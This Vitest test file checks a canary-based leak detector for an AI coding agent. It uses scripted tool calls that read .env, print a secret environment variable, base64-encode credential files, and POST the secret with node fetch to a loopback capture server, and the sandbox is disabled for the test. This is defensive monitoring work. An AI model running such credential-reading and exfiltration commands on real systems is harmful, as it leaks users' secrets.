import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { fauxAssistantMessage, fauxToolCall } from "@earendil-works/pi-ai";
import type { FauxResponseFactory, ToolResultMessage } from "@earendil-works/pi-ai/compat";
import { afterEach, describe, expect, it, vi } from "vitest";
import { ENV_AGENT_DIR } from "../../src/config.ts";
import permissions from "../../src/fork/permissions.ts";
import {
	CANARY_ENV_NAME,
	type CanaryPlant,
	type CanaryReport,
	plantCanaries,
	scanCanaries,
	startCanaryServer,
} from "./canaries.ts";
import { createHarness, createTestUiContext, type Harness } from "./harness.ts";

describe("canary leak detection", () => {
	const harnesses: Harness[] = [];
	const plants: CanaryPlant[] = [];
	const serverClosers: Array<() => Promise<void>> = [];

	afterEach(async () => {
		while (serverClosers.length) await serverClosers.pop()?.();
		while (harnesses.length) harnesses.pop()?.cleanup();
		while (plants.length) await plants.pop()?.close();
		vi.unstubAllEnvs();
	});

	async function setup() {
		const harness = await createHarness({ extensionFactories: [permissions] });
		harnesses.push(harness);
		const plant = plantCanaries(harness.tempDir);
		plants.push(plant);
		vi.stubEnv(ENV_AGENT_DIR, plant.agentDir);
		writeFileSync(join(plant.agentDir, "permissions.json"), JSON.stringify({ mode: "broad" }));
		// These tests check the leak detector, so commands run outside the sandbox, which would block
		// the loopback request; fork-sandbox.test.ts covers the sandbox.
		writeFileSync(join(plant.agentDir, "settings.json"), JSON.stringify({ sandbox: { modes: { broad: false } } }));
		await harness.session.bindExtensions({
			uiContext: createTestUiContext({ select: async (_title, choices) => choices[0] }),
		});
		return { harness, plant };
	}

	function toolResults(harness: Harness): ToolResultMessage[] {
		return harness.session.messages.filter((message): message is ToolResultMessage => message.role === "toolResult");
	}

	function verifyReport(report: CanaryReport, touched: number): void {
		expect(report.touched).toBe(touched);
		expect(report.total).toBe(4);
	}

	function recordRequest(requests: unknown[], response: ReturnType<typeof fauxAssistantMessage>): FauxResponseFactory {
		return (context) => {
			// The whole context: system prompt, messages and tool definitions.
			requests.push(context);
			return response;
		};
	}

	it("detects a canary deliberately read with the real read tool", async () => {
		const { harness, plant } = await setup();
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("read", { path: ".env" })], { stopReason: "toolUse" }),
			),
			recordRequest(requests, fauxAssistantMessage("Read complete.")),
		]);

		await harness.session.prompt("Read .env.");
		const report = scanCanaries({
			scenario: "read workspace canary",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
		});
		verifyReport(report, 1);
		expect(report.hits[0]).toMatchObject({
			id: "workspace-dotenv",
			where: expect.arrayContaining([expect.stringContaining("tool result")]),
		});
	}, 10_000);

	it("detects an environment canary in bash output and the next model request", async () => {
		const { harness, plant } = await setup();
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("bash", { command: `printenv ${CANARY_ENV_NAME}`, timeout: 3 })], {
					stopReason: "toolUse",
				}),
			),
			recordRequest(requests, fauxAssistantMessage("The command finished.")),
		]);

		await harness.session.prompt("Print the provider environment value.");
		const report = scanCanaries({
			scenario: "environment in bash result and next request",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
		});
		verifyReport(report, 1);
		expect(report.hits[0]?.where).toEqual(
			expect.arrayContaining([expect.stringContaining("tool result"), expect.stringContaining("model request")]),
		);
	}, 10_000);

	it("records a canary sent by bash to the loopback HTTP server", async () => {
		const { harness, plant } = await setup();
		const server = await startCanaryServer();
		serverClosers.push(server.close);
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage(
					[
						fauxToolCall("bash", {
							command: `node -e "fetch('${server.url}', { method: 'POST', body: process.env.${CANARY_ENV_NAME} })"`,
							timeout: 3,
						}),
					],
					{ stopReason: "toolUse" },
				),
			),
			recordRequest(requests, fauxAssistantMessage("Request complete.")),
		]);

		await harness.session.prompt("Send the environment value to the local test endpoint.");
		const report = scanCanaries({
			scenario: "bash network exfiltration to loopback",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
			networkRequests: server.requests,
		});
		verifyReport(report, 1);
		expect(server.requests).toHaveLength(1);
		expect(server.requests[0]?.requestLine).toContain("POST /capture HTTP/1.1");
		expect(report.hits[0]?.where.some((where) => where.includes("network request"))).toBe(true);
	}, 10_000);

	it("does not report ordinary file reads and edits", async () => {
		const { harness, plant } = await setup();
		writeFileSync(join(plant.workspace, "note.txt"), "before\n");
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("read", { path: "note.txt" })], { stopReason: "toolUse" }),
			),
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("edit", { path: "note.txt", oldText: "before", newText: "after" })], {
					stopReason: "toolUse",
				}),
			),
			recordRequest(requests, fauxAssistantMessage("Updated.")),
		]);

		await harness.session.prompt("Read and update the ordinary note.");
		const report = scanCanaries({
			scenario: "benign read and edit",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
		});
		verifyReport(report, 0);
		expect(readFileSync(join(plant.workspace, "note.txt"), "utf8")).toBe("after\n");
	}, 10_000);

	it("detects a file sent through base64, wrapped and at any byte offset", async () => {
		const { harness, plant } = await setup();
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("bash", { command: "base64 .env", timeout: 3 })], {
					stopReason: "toolUse",
				}),
			),
			recordRequest(requests, fauxAssistantMessage("Encoded.")),
		]);

		await harness.session.prompt("Encode the env file.");
		const report = scanCanaries({
			scenario: "base64 of a whole canary file",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
		});
		verifyReport(report, 1);
		expect(report.hits[0]?.id).toBe("workspace-dotenv");
	}, 10_000);

	it("detects a base64 encoded canary in an agent-written file", async () => {
		const { harness, plant } = await setup();
		const token = plant.canaries.find((canary) => canary.id === "agent-auth")?.token;
		if (!token) throw new Error("Missing agent auth canary");
		const encoded = Buffer.from(token, "utf8").toString("base64");
		const requests: unknown[] = [];
		harness.setResponses([
			recordRequest(
				requests,
				fauxAssistantMessage([fauxToolCall("write", { path: "encoded-leak.txt", content: encoded })], {
					stopReason: "toolUse",
				}),
			),
			recordRequest(requests, fauxAssistantMessage("Written.")),
		]);

		await harness.session.prompt("Write the encoded value.");
		const report = scanCanaries({
			scenario: "base64 encoded canary written to workspace",
			plant,
			modelRequests: requests,
			toolResults: toolResults(harness),
			session: harness.session.messages,
		});
		verifyReport(report, 1);
		expect(report.hits[0]?.where.some((where) => where.startsWith("file "))).toBe(true);
	}, 10_000);

	it("finds a base64-encoded canary whatever its offset in the encoded text", async () => {
		const { plant } = await setup();
		const canary = plant.canaries[1];
		for (const prefix of ["", "a", "ab"]) {
			const encoded = Buffer.from(`${prefix}${canary.token}\n`).toString("base64");
			const report = scanCanaries({ scenario: `base64 offset ${prefix.length}`, plant, modelRequests: [encoded] });
			expect(
				report.hits.map((hit) => hit.id),
				`offset ${prefix.length}`,
			).toEqual([canary.id]);
		}
	});
});
